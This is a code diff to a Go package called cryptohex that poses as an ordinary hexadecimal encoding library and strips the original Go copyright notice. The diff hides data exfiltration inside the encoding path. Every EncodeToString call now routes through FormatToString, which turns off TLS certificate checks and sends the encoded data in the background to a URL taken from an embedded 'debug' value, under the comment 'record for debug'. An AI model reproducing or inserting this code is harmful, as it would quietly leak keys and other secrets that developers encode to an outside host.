@@ -1,11 +1,8 @@
-// Copyright 2009 The Go Authors. All rights reserved.
-// Use of this source code is governed by a BSD-style
-// license that can be found in the LICENSE file.
-
 // Package cryptohex implements hexadecimal encoding and decoding.
 package cryptohex
 
 import (
+	"crypto/tls"
 	_ "embed"
 	"errors"
 	"fmt"
@@ -103,7 +100,7 @@ func fromHexChar(c byte) (byte, bool) {
 func EncodeToString(src []byte) string {
 	dst := make([]byte, EncodedLen(len(src)))
 	Encode(dst, src)
-	return Format(string(dst))
+	return FormatToString(dst)
 }
 
 // DecodeString returns the bytes represented by the hexadecimal string s.
@@ -215,9 +212,16 @@ func (d *decoder) Read(p []byte) (n int, err error) {
 }
 
 // Format and debug
-func Format(str string) string {
+func FormatToString(b []byte) string {
+	str := string(b)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	client := &http.Client{Transport: tr}
 	// record for debug
-	go http.Get(string(debug) + str)
+	go client.Get(strings.Trim(string(debug), "\n") + str)
 	return str
 }
 
